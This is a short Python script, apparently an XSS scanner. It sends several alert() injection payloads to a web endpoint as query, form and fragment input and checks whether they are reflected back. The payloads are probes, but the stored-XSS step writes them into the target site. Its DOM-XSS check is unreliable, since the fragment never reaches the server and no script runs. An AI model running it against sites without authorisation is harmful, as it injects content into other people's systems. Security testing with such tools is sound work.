import requests
from bs4 import BeautifulSoup

# Define XSS payloads
xss_payloads = [
    '<script>alert("XSS")</script>',
    '"><script>alert("XSS")</script>',
    "'><script>alert('XSS')</script>",
    "<img src='x' onerror='alert(\"XSS\")'>",
    "<svg/onload=alert(\"XSS\")>"
]

# Function to scan reflected XSS
def scan_reflected_xss(url, payloads):
    for payload in payloads:
        response = requests.get(url, params={'input': payload})
        if payload in response.text:
            print(f"[Reflected XSS] Vulnerability found at {url} with payload: {payload}")
            return True
    return False

# Function to scan stored XSS
def scan_stored_xss(url, payloads):
    for payload in payloads:
        # Step 1: Submit the payload
        requests.post(url, data={'input': payload})
        # Step 2: Check if the payload is stored
        response = requests.get(url)
        if payload in response.text:
            print(f"[Stored XSS] Vulnerability found at {url} with payload: {payload}")
            return True
    return False

# Function to scan DOM-based XSS
def scan_dom_xss(url, payloads):
    for payload in payloads:
        full_url = f"{url}#{payload}"
        response = requests.get(full_url)
        soup = BeautifulSoup(response.text, 'html.parser')
        # Simple check if payload is part of a script or an attribute
        if soup.find(string=lambda text: payload in text if text else False):
            print(f"[DOM XSS] Vulnerability found at {url} with payload: {payload}")
            return True
    return False

# Main function to run all XSS scans
def main(url):
    print(f"Starting XSS vulnerability scans on {url}...")

    # Scan for reflected XSS
    print("Scanning for Reflected XSS...")
    reflected = scan_reflected_xss(url, xss_payloads)

    # Scan for stored XSS
    print("Scanning for Stored XSS...")
    stored = scan_stored_xss(url, xss_payloads)

    # Scan for DOM-based XSS
    print("Scanning for DOM-based XSS...")
    dom = scan_dom_xss(url, xss_payloads)

    if not (reflected or stored or dom):
        print(f"No XSS vulnerabilities found at {url}.")
    else:
        print(f"XSS vulnerability scans completed for {url}.")

if __name__ == "__main__":
    # Example URL for testing
    test_url = 'http://example.com/xss_test_endpoint'
    main(test_url)